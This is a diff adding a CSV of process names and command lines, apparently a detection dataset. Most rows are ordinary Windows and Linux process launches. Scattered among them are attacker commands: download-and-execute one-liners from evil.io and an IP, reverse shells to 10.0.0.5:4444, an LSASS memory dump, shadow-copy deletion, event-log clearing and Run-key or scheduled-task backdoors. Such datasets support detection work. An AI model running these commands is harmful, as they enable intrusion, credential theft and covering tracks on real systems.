@@ -1,0 +1,221 @@
+process_name,command_line
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4
+net.exe,net use Z: \\fileserver\share
+net.exe,net use Z: \\fileserver\share
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml  # session 140
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+docker,docker ps --format '{{.Names}}'
+schtasks.exe,schtasks /query /fo table
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p  # session 180
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+bash,bash -c 'ls -la /var/log'
+nginx,nginx -g 'daemon off;'
+net.exe,net use Z: \\fileserver\share
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000  # session 124
+explorer.exe,C:\Windows\Explorer.EXE
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+powershell.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
+awk,awk '{print $1}' /var/log/syslog
+bash,bash -c 'ls -la /var/log'
+schtasks.exe,schtasks /query /fo table
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler  # session 108
+docker,docker ps --format '{{.Names}}'
+awk,awk '{print $1}' /var/log/syslog
+wmic.exe,wmic logicaldisk get caption
+docker,docker ps --format '{{.Names}}'
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+powershell.exe,powershell -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.io/a.ps1')
+awk,awk '{print $1}' /var/log/syslog
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js"
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+schtasks.exe,schtasks /query /fo table
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents  # session 76
+awk,awk '{print $1}' /var/log/syslog
+certutil.exe,certutil.exe -urlcache -split -f http://185.23.44.9/payload.exe C:\Users\Public\p.exe
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler  # session 48
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+bash,bash -c 'exec 5<>/dev/tcp/10.0.0.5/4444; cat <&5 | while read l; do $l 2>&5 >&5; done'
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler
+net.exe,net use Z: \\fileserver\share
+docker,docker ps --format '{{.Names}}'
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all  # session 44
+bitsadmin.exe,bitsadmin /transfer job /download /priority high http://evil.io/m.exe C:\Temp\m.exe
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+certutil.exe,certutil.exe -?   # session 160
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe  # session 68
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000  # session 184
+python3,"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",4444));os.dup2(s.fileno(),0);subprocess.call([""/bin/sh"",""-i""])'"
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer"
+nginx,nginx -g 'daemon off;'
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+certutil.exe,certutil.exe -?   # session 100
+bash,bash -c 'ls -la /var/log'
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler  # session 168
+nginx,nginx -g 'daemon off;'
+certutil.exe,certutil.exe -? 
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+awk,awk '{print $1}' /var/log/syslog
+certutil.exe,certutil.exe -?   # session 40
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml
+schtasks.exe,schtasks /query /fo table  # session 192
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe  # session 8
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p  # session 0
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe  # session 128
+wmic.exe,wmic logicaldisk get caption
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL  # session 56"
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer"
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js"
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000  # session 64
+docker,docker ps --format '{{.Names}}'
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents  # session 136
+vssadmin.exe,vssadmin delete shadows /all /quiet
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4  # session 28
+wmic.exe,wmic logicaldisk get caption
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+explorer.exe,C:\Windows\Explorer.EXE
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents  # session 16
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new ActiveXObject(""WScript.Shell"")"
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+wmic.exe,wmic logicaldisk get caption
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar  # session 24
+explorer.exe,C:\Windows\Explorer.EXE
+perl,"perl -e 'use Socket;$i=""10.0.0.5"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));exec(""/bin/sh -i"");'"
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml
+sshd,/usr/sbin/sshd -D  # session 112
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer  # session 92"
+schtasks.exe,schtasks /query /fo table  # session 12
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL"
+bash,bash -c 'ls -la /var/log'
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js  # session 36"
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000  # session 4
+cmd.exe,"cmd.exe /c ""^s^e^t^ ^x^=^p^o^w^e^r^s^h^e^l^l^&^&^!^x^! -nop -w hidden -c iex(iwr http://a.io)"""
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL  # session 176"
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml  # session 20
+explorer.exe,C:\Windows\Explorer.EXE
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+wmic.exe,wmic /node:10.0.0.5 process call create cmd.exe /c powershell -enc ZQB2AGkAbAA=
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+explorer.exe,C:\Windows\Explorer.EXE
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer  # session 152"
+net.exe,net use Z: \\fileserver\share
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all  # session 164
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all  # session 104
+schtasks.exe,schtasks /create /sc minute /mo 1 /tn UpdaterTask /tr C:\Users\Public\bd.exe /f
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js  # session 96"
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents
+reg.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d C:\Users\Public\bd.exe /f
+wmic.exe,wmic logicaldisk get caption
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+wmic.exe,wmic logicaldisk get caption
+docker,docker ps --format '{{.Names}}'
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL"
+python.exe,C:\Python311\python.exe manage.py runserver 0.0.0.0:8000
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer"
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar  # session 144
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe
+net.exe,net use Z: \\fileserver\share
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p
+certutil.exe,certutil.exe -? 
+mshta.exe,mshta.exe javascript:a=GetObject('script:http://evil.io/x.sct').Exec();close();
+sshd,/usr/sbin/sshd -D  # session 172
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+sshd,/usr/sbin/sshd -D  # session 52
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js"
+awk,awk '{print $1}' /var/log/syslog
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p
+net.exe,net use Z: \\fileserver\share
+awk,"awk 'BEGIN {system(""/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1"")}'"
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL"
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar  # session 84
+wevtutil.exe,wevtutil cl Security && wevtutil cl System && wevtutil cl Application
+rundll32.exe,"rundll32.exe C:\windows\temp\evil.dll,DllMain comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full"
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+bash,bash -c 'ls -la /var/log'
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar
+nginx,nginx -g 'daemon off;'
+powershell.exe,powershell.exe -w hidden -nop -c $b=[Convert]::FromBase64String('aQBlAHgA');iex([Text.Encoding]::Unicode.GetString($b))
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p  # session 120
+explorer.exe,C:\Windows\Explorer.EXE
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+ipconfig.exe,C:\Windows\System32\ipconfig.exe /all
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js  # session 156"
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p  # session 60
+nginx,nginx -g 'daemon off;'
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+certutil.exe,certutil.exe -? 
+schtasks.exe,schtasks /query /fo table  # session 132
+certutil.exe,certutil.exe -? 
+regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil.io/file.sct scrobj.dll
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding
+bash,bash -c 'ls -la /var/log'
+nginx,nginx -g 'daemon off;'
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+explorer.exe,C:\Windows\Explorer.EXE
+Code.exe,"""C:\Program Files\Microsoft VS Code\Code.exe"" --no-sandbox"
+bash,bash -c 'ls -la /var/log'
+nc,nc -e /bin/sh 10.0.0.5 4444
+sshd,/usr/sbin/sshd -D
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe  # session 188
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4  # session 88
+OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+cmd.exe,cmd.exe /c dir C:\Users\jdoe\Documents  # session 196
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4  # session 148
+java,/usr/bin/java -Xmx2g -jar /opt/app/service.jar
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer  # session 32"
+Teams.exe,C:\Users\jdoe\AppData\Local\Microsoft\Teams\current\Teams.exe
+python3,python3 /opt/app/worker.py --config /etc/app/conf.yaml  # session 80
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4
+schtasks.exe,schtasks /query /fo table  # session 72
+chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer"
+sshd,/usr/sbin/sshd -D
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler
+git.exe,"""C:\Program Files\Git\cmd\git.exe"" status"
+conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4
+sshd,/usr/sbin/sshd -D
+powershell.exe,powershell.exe Get-Process | Sort-Object CPU
+MsMpEng.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe
+node.exe,"""C:\Program Files\nodejs\node.exe"" server.js"
+reg.exe,reg query HKLM\Software\Microsoft\Windows /s
+certutil.exe,C:\Windows\System32\certutil.exe -hashfile C:\setup\app.msi SHA256
+rundll32.exe,"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL  # session 116"
+powershell.exe,powershell.exe -Command Get-Service -Name Spooler
